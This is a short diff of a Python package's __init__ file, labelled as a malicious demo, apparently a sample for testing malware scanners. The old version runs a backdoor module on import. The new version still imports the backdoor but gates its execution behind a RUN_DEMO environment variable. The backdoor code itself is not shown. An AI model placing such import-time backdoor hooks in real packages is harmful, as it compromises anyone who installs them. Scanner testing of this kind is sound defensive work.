@@ -1,8 +1,7 @@
-# MALICIOUS (DEMO): This package runs a backdoor when imported
-import sys
+# MALICIOUS (DEMO): Backdoor code present for scanners but gated at runtime
 import os
 
-# Import and execute backdoor on module load
-from .run_backdoor import *  # noqa: F401,F403
+from .run_backdoor import run_backdoor_main  # noqa: F401
 
-print("[Backdoor] Package initialized - backdoor is active")
+if os.getenv("RUN_DEMO") == "1":
+	run_backdoor_main()
